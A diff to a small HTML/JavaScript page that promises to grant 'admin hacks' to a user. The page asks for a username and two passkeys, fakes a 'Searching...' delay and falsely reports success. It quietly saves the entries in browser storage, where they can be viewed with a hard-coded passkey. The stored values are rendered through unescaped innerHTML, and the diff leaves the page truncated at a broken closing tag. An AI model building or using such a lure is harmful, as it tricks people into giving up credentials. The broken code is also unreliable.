@@ -20,7 +20,7 @@
         }
 
         #displayDataBtn {
-            display: none; /* Initially hidden */
+            display: none;
         }
 
         .data-entry {
@@ -34,10 +34,10 @@
 </head>
 <body>
 
-    <h1>Press to give <input type="text" id="username" name="username"> (selected user) admin hacks</h1>
+    <h1>Press to give <input type="text" id="username" placeholder="Enter username"> (selected user) admin hacks</h1>
     <p>
-        USER INFO: <input type="text" id="Passkey1" name="Passkey">
-        Passkey: <input type="text" id="Passkey2" name="Passkey">
+        USER INFO: <input type="text" id="Passkey1" placeholder="Enter passkey 1">
+        Passkey: <input type="text" id="Passkey2" placeholder="Enter passkey 2">
     </p>
 
     <button onclick="recordData()">GIVE ADMIN HACKS</button>
@@ -48,81 +48,64 @@
 
     <button id="displayDataBtn" onclick="displayData()">DISPLAY STORED DATA</button>
 
-    <!-- Custom "Searching..." message -->
     <div id="searchingMessage">Searching...</div>
 
     <h3>Stored Data:</h3>
-    <div id="storedData"></div> <!-- The data will be displayed here -->
+    <div id="storedData"></div>
 
     <script>
-        // Secret passkey (this can be any passkey you want)
-        const correctPasskey = "admin123"; // Replace with your own passkey
+        const correctPasskey = "admin123"; 
 
-        // Function to record the user data
         function recordData() {
             const username = document.getElementById('username').value;
             const passkey1 = document.getElementById('Passkey1').value;
             const passkey2 = document.getElementById('Passkey2').value;
 
-            // Show the "Searching..." message
+            if (!username || !passkey1 || !passkey2) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
             document.getElementById('searchingMessage').style.display = 'block';
 
-            // Simulate a delay (for demonstration purposes)
             setTimeout(function() {
-                // Hide the "Searching..." message after 3 seconds
                 document.getElementById('searchingMessage').style.display = 'none';
 
-                // Create an object with the data
                 const data = {
                     username: username,
                     passkey1: passkey1,
                     passkey2: passkey2,
-                    timestamp: new Date().toLocaleString() // Add a timestamp for when the data was recorded
+                    timestamp: new Date().toLocaleString()
                 };
 
-                // Retrieve the current stored data (if any)
                 let storedData = JSON.parse(localStorage.getItem('userData')) || [];
-
-                // Add the new data to the stored data array
                 storedData.push(data);
-
-                // Save the updated data back to local storage
                 localStorage.setItem('userData', JSON.stringify(storedData));
 
-                // Show the success message after data is saved
                 alert('Admin Hacks Given!');
-            }, 3000);  // 3 seconds delay
+            }, 3000); 
         }
 
-        // Function to check if the entered passkey is correct
         function checkPasskey() {
             const enteredPasskey = document.getElementById('secretPasskey').value;
 
             if (enteredPasskey === correctPasskey) {
-                // If passkey is correct, show the "Display Data" button
-                document.getElementById('displayDataBtn').style.display = 'inline-block'; // Make the button visible
+                document.getElementById('displayDataBtn').style.display = 'inline-block';
                 alert("Passkey is correct! You can now view the stored data.");
             } else {
                 alert("Incorrect passkey. Please try again.");
             }
         }
 
-        // Function to display the stored data
         function displayData() {
-            // Retrieve data from local storage
             const storedData = JSON.parse(localStorage.getItem('userData')) || [];
-
             const storedDataContainer = document.getElementById('storedData');
-            storedDataContainer.innerHTML = ''; // Clear any previous data displayed
+            storedDataContainer.innerHTML = '';
 
             if (storedData.length > 0) {
-                // Loop through the stored data and create a list of entries
                 storedData.forEach((data, index) => {
-                    // Create a div for each entry
                     const dataDiv = document.createElement('div');
                     dataDiv.classList.add('data-entry');
-
-                    // Display the data (with a timestamp)
                     dataDiv.innerHTML = `
                         <strong>Entry #${index + 1}</strong><br>
                         Username: ${data.username}<br>
@@ -130,24 +113,14 @@
                         Passkey 2: ${data.passkey2}<br>
                         <small>Recorded at: ${data.timestamp}</small>
                     `;
-
-                    // Append the entry to the display container
                     storedDataContainer.appendChild(dataDiv);
                 });
             } else {
-                // If no data is found, show a message
                 storedDataContainer.innerHTML = 'No data found in local storage.';
             }
         }
-    </script>
+    </
 
-    <p>Tool Created By Arnav.</p>
-    <br>
-    <p style="color:#FF0000">WARNING: Data will be permanently deleted!</p>
-    </br>
-
-</body>
-</html>
 
 
 
